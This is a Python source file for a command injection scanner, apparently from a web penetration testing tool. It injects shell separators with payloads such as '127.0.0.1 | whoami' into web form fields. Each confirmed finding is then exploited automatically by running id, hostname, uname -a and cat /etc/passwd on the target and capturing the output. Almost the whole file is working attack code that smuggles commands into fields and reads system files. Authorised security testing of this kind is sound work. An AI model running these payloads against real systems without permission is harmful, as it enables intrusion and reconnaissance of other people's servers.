import requests
from colorama import Fore, init
import re

init(autoreset=True)

class CommandInjectionScanner:
    SEPARATORS = [";", "|", "&&", "\n"]

    def __init__(self, session):
        self.session = session
        self.findings = []

    def _extract_output(self, html):
        match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
        if match:
            raw = match.group(1)
            clean = re.sub(r'<[^>]+>', '\n', raw).strip()
            return clean
        return None

    # ─────────────────────────────────────────────
    # DETECTION — two-step verification to kill false positives
    # ─────────────────────────────────────────────
    # Step 1: echo a unique token, check it appears in response
    # Step 2: verify by running 'whoami' and checking the output
    #         looks like a real Linux username (not our injected string)
    #         This kills false positives from pages that just reflect input
    def detect(self, url, method, param_name, base_params):
        token = "CMDINJX_9f3a"

        for sep in self.SEPARATORS:
            # Step 1 — token echo test
            payload = f"127.0.0.1{sep}echo {token}"
            test_params = base_params.copy()
            test_params[param_name] = payload

            try:
                if method == "post":
                    resp = self.session.post(url, data=test_params, timeout=15)
                else:
                    resp = self.session.get(url, params=test_params, timeout=15)
            except requests.exceptions.RequestException:
                continue

            if token not in resp.text:
                continue

            # Step 2 — verification: inject whoami and check the response
            # contains something that looks like a real Linux username
            # (lowercase word 1-32 chars, possibly with hyphens/underscores)
            # A page that just reflects input would show "127.0.0.1|whoami"
            # back literally — not an actual username
            verify_params = base_params.copy()
            verify_params[param_name] = f"nonexistent_host_xyz|whoami"

            try:
                if method == "post":
                    verify_resp = self.session.post(url, data=verify_params, timeout=15)
                else:
                    verify_resp = self.session.get(url, params=verify_params, timeout=15)
            except requests.exceptions.RequestException:
                continue

            output = self._extract_output(verify_resp.text)
            page_text = verify_resp.text

            # Real whoami output: a short word like "www-data", "root",
            # "apache" appearing in the response without our injection
            # string surrounding it — use regex to find a standalone word
            # that could plausibly be a Linux username
            username_pattern = re.search(
                r'\b(root|www-data|apache|nginx|nobody|daemon|[a-z][a-z0-9_-]{1,30})\b',
                output or ""
            )

            # Also reject if the response literally echoes back our
            # injection string — that's a reflection, not execution
            if username_pattern and "nonexistent_host_xyz" not in (output or ""):
                print(f"{Fore.RED}[!] Command injection CONFIRMED -> {url} "
                      f"param='{param_name}' separator='{sep}' "
                      f"verified as: '{username_pattern.group(1)}'")
                return {"separator": sep, "param": param_name,
                        "verified_user": username_pattern.group(1)}

        return None

    # ─────────────────────────────────────────────
    # EXPLOITATION — use pipe (|) to suppress ping output
    # and show ONLY our command's result cleanly
    # ─────────────────────────────────────────────
    def exploit(self, url, method, param_name, base_params, separator):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   COMMAND INJECTION EXPLOITATION -> {url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        commands = {
            "whoami":          "web server process user",
            "id":              "full user/group context",
            "hostname":        "target hostname",
            "uname -a":        "OS and kernel version",
            "cat /etc/passwd": "local system users"
        }

        exploitation_results = {}

        for cmd, description in commands.items():
            # Use | for exploitation regardless of which separator
            # was used for detection — pipe suppresses the ping output
            # completely and returns ONLY the injected command's stdout
            payload = f"127.0.0.1 | {cmd}"
            test_params = base_params.copy()
            test_params[param_name] = payload

            try:
                if method == "post":
                    resp = self.session.post(url, data=test_params, timeout=15)
                else:
                    resp = self.session.get(url, params=test_params, timeout=15)
            except requests.exceptions.RequestException:
                continue

            output = self._extract_output(resp.text)

            if output and len(output.strip()) > 0:
                clean_output = output.strip()[:300]
                print(f"{Fore.RED}[+] {cmd:<22} -> {description}")
                for line in clean_output.split('\n')[:5]:
                    if line.strip():
                        print(f"{Fore.YELLOW}    {line.strip()}")
                exploitation_results[cmd] = clean_output
            else:
                print(f"{Fore.YELLOW}[?] {cmd:<22} -> no output captured")

        return exploitation_results

    def scan_all(self, discovered_forms):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   COMMAND INJECTION SCAN")
        print(f"{Fore.CYAN}{'='*55}\n")

        for url, forms in discovered_forms.items():
            for form in forms:
                method = form["method"]
                inputs = form["inputs"]
                base_params = {inp["name"]: inp.get("value", "test") for inp in inputs}

                for inp in inputs:
                    if inp["type"] in ("submit", "hidden") or "token" in inp["name"].lower():
                        continue

                    result = self.detect(url, method, inp["name"], base_params)

                    if result:
                        exploit_results = self.exploit(
                            url, method, result["param"],
                            base_params, result["separator"]
                        )
                        self.findings.append({
                            "type": "COMMAND_INJECTION",
                            "severity": "CRITICAL",
                            "url": url,
                            "parameter": result["param"],
                            "separator": result["separator"],
                            "verified_user": result.get("verified_user"),
                            "commands_executed": exploit_results
                        })

        print(f"\n{Fore.CYAN}[*] Command injection scan complete: "
              f"{len(self.findings)} finding(s)")
        return self.findings
